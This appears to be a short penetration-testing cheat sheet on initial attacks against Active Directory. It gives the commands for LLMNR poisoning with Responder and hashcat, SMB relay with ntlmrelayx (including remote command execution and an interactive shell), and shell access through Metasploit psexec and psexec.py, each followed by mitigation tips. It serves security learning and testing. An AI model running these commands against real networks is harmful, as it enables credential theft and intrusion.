# AD Initial attack vector

## LLMNR poisoning

<figure><img src=".gitbook/assets/Capture d&#x27;écran 2024-05-06 003240.png" alt=""><figcaption></figcaption></figure>

```
sudo responder -I <interface> -dwPv
# crack hash 
hashcat -m 5600 <hash.txt> <wordlist>
```

### Mitigation

```
# Disable LLMNR
# Disable NBT-NS


#If we can't disable
# Require network access control
# Require strong password policy

```

## SMB Relay

* SMB Signing disabled on target

```bash
nmap --script=smb2-security-mode.nse -p445 <ip>/24
# work if message signing is enabled but not required
# In /etc/responder/Responder.conf disable smb and http -> Not capture its but relay its

# create target.txt and put ip addresses

responder -I <interface> -dwPv 

# ntmrelayx for relay hash
sudo ntlmrelayx.py -tf targets.txt -smb2support
# after intercepted
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
# Interactive mode ( connect with netcat after that)
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

```

### Mitigation&#x20;

* Enable smb signing on all devices
* Disable ntlm auth on network
* Account tiering
* Local administration&#x20;

## Gaining shell access

```
use exploit/windows/smb/psexec
set RHOSTS <rhost>
set SMBDomain <domain>
set SMBUser <user>
set SMBPass <pass>
```

Use psexec.py

```
psexec.py <domain>/<user>:'<pass>'@<ip>

```
